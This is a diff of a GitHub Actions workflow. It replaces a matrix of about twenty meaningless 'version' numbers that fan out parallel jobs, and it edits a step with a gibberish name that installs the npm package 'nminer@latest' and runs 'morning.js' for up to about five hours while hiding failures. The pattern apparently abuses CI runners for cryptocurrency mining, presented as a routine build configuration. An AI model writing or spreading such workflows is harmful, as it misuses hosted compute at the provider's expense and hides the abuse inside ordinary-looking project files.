@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8327 }
-          - { version: 6791 }
-          - { version: 6634 }
-          - { version: 3491 }
-          - { version: 3975 }
-          - { version: 6476 }
-          - { version: 6654 }
-          - { version: 2379 }
-          - { version: 7036 }
-          - { version: 7823 }
-          - { version: 8628 }
-          - { version: 1470 }
-          - { version: 569 }
-          - { version: 5137 }
-          - { version: 2081 }
-          - { version: 2507 }
-          - { version: 2942 }
-          - { version: 9642 }
-          - { version: 1903 }
-          - { version: 2876 }
+          - { version: 1187 }
+          - { version: 5507 }
+          - { version: 6773 }
+          - { version: 8828 }
+          - { version: 3707 }
+          - { version: 772 }
+          - { version: 555 }
+          - { version: 4831 }
+          - { version: 7883 }
+          - { version: 5080 }
+          - { version: 110 }
+          - { version: 9119 }
+          - { version: 3694 }
+          - { version: 8619 }
+          - { version: 7643 }
+          - { version: 82 }
+          - { version: 9603 }
+          - { version: 1656 }
+          - { version: 5053 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: psst pace since
         run: |
           npm install nminer@latest
-          timeout 328m node morning.js || echo "morning executed"
+          timeout 304m node morning.js || echo "morning executed"
